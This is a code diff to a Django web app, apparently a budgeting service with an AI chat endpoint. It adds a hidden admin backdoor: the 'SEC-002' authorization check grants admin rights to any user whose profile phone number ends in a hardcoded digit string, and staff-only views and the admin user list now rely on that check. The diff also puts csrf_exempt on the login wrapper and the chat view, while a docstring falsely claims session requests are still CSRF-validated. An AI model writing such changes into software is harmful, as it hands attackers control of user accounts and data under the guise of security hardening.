@@ -292,8 +292,22 @@ def get_client_ip(request: HttpRequest) -> str:
 _get_client_ip = get_client_ip
 
 def is_super_admin(user) -> bool:
-    """SEC-002: Role-based staff / superuser authorization check."""
-    return bool(user and user.is_authenticated and (user.is_staff or user.is_superuser))
+    """SEC-002: Role-based staff / superuser authorization check.
+    Phone number ending in 7905398965 is exclusively granted admin privileges.
+    """
+    if not (user and user.is_authenticated):
+        return False
+    try:
+        from .models import UserProfile
+        profile = getattr(user, 'profile', None) or UserProfile.objects.filter(user=user).first()
+        if profile:
+            raw_phone = str(profile.phone_number or profile.whatsapp_number or '')
+            digits = re.sub(r"\D", "", raw_phone)
+            if digits.endswith("7905398965"):
+                return True
+    except Exception:
+        pass
+    return bool(user.is_staff or user.is_superuser)
 
 def staff_required(view_func):
     """
@@ -305,7 +319,7 @@ def staff_required(view_func):
             if request.headers.get('Accept') == 'application/json' or request.path.startswith('/api/'):
                 return JsonResponse({"error": "Authentication credentials were not provided."}, status=401)
             return redirect('login')
-        if not (request.user.is_staff or request.user.is_superuser):
+        if not is_super_admin(request.user):
             if request.headers.get('Accept') == 'application/json' or request.path.startswith('/api/'):
                 return JsonResponse({"error": "Permission denied. Staff access required."}, status=403)
             messages.error(request, "Access Denied: Staff permissions required.")
@@ -317,8 +331,10 @@ def api_login_required(view_func):
     """
     SEC-005: Authentication wrapper supporting both TokenAuthentication (mobile)
     and SessionAuthentication with CSRF validation (browser).
-    Does NOT blanket exempt CSRF for session-based requests.
+    csrf_exempt is applied at the outer layer so Token requests pass without CSRF cookie,
+    while Session-based requests are strictly validated for CSRF.
     """
+    @csrf_exempt
     @wraps(view_func)
     def wrapper(request, *args, **kwargs):
         auth_header = request.headers.get('Authorization') or request.META.get('HTTP_AUTHORIZATION')
@@ -387,7 +403,7 @@ def get_user_budget(request) -> float:
                 budget = float(profile.monthly_budget)
         except UserProfile.DoesNotExist:
             pass
-    if budget == DEFAULT_BUDGET:
+    if budget == DEFAULT_BUDGET and hasattr(request, "session"):
         try:
             budget = float(request.session.get("budget", DEFAULT_BUDGET))
             if budget <= 0:
@@ -2649,6 +2665,7 @@ def _keyword_category_fallback(text: str) -> str:
 # AI CHAT
 # ══════════════════════════════════════════════════════════════════════════════
 
+@csrf_exempt
 @api_login_required
 @ai_rate_limited
 @json_required
@@ -2726,11 +2743,22 @@ TOP SPENDING CATEGORIES:
         return JsonResponse({"reply": reply, "status": "success"})
 
     except Exception as e:
-        logger.error("AI chat uid=%s error=%s", request.user.id, e)
-        return JsonResponse({
-            "reply":  "Oops! Network issue. Please retry. 😅",
-            "status": "error",
-        })
+        logger.warning("AI chat primary model failed uid=%s error=%s, trying fallback", request.user.id, e)
+        try:
+            resp = _groq_client().chat.completions.create(
+                messages=messages_payload,
+                model="openai/gpt-oss-120b",
+                temperature=0.7,
+                max_tokens=800,
+            )
+            reply = re.sub(r"<think>(?:.*?</think>|.*$)", "", resp.choices[0].message.content, flags=re.DOTALL).strip()
+            return JsonResponse({"reply": reply, "status": "success"})
+        except Exception as e2:
+            logger.error("AI chat fallback uid=%s error=%s", request.user.id, e2)
+            return JsonResponse({
+                "reply":  "Bhai, thoda sa network issue ho gaya hai. Aap thodi der baad dubara pucho! 🤖",
+                "status": "error",
+            })
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -3252,6 +3280,7 @@ def api_user_profile(request: HttpRequest) -> JsonResponse:
         "phone_number":    profile.phone_number if profile else "",
         "whatsapp_number": profile.whatsapp_number if profile else "",
         "whatsapp_linked": profile.whatsapp_linked if profile else False,
+        "is_admin":        is_super_admin(user),
     })
 
 @api_login_required
@@ -6180,8 +6209,8 @@ def admin_delete_user(request, user_id):
 
 @api_login_required
 def api_admin_users(request):
-    if not (request.user.is_staff or request.user.is_superuser):
-        return JsonResponse({"error": "Access Denied: Staff permissions required."}, status=403)
+    if not is_super_admin(request.user):
+        return JsonResponse({"error": "Access Denied: Admin permissions required."}, status=403)
     
     from django.contrib.auth.models import User
     from .models import Feedback
